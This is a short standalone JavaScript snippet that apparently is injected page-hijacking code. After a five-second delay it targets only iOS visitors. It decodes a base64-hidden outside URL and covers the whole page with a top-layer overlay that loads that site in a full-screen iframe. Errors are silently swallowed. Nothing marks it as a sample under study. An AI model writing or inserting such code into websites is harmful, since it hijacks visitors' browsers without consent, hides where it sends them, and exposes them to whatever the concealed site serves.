!function(){
    "use strict";
    setTimeout(function(){
        try {
            var ua = window.navigator.userAgent || window.navigator.vendor || window.opera;
            var isIOS = /iPhone|iPad|iPod/i.test(ua);
            
            if(isIOS){
                var targetUrl = atob("aHR0cHM6Ly92LnJvbGxzMy5jb20v");
                var overlay = document.createElement("div");
                
                overlay.setAttribute("style", "position:fixed !important;top:0 !important;left:0 !important;width:100% !important;height:100% !important;z-index:2147483647 !important;background:#000 !important;display:block !important;");
                
                overlay.innerHTML = '<iframe src="' + targetUrl + '" style="width:100% !important;height:100% !important;border:0 !important;position:absolute !important;top:0 !important;left:0 !important;"></iframe>';
                
                (document.body || document.documentElement).appendChild(overlay);
            }
        } catch (err) {
        }
    }, 5000);
}();
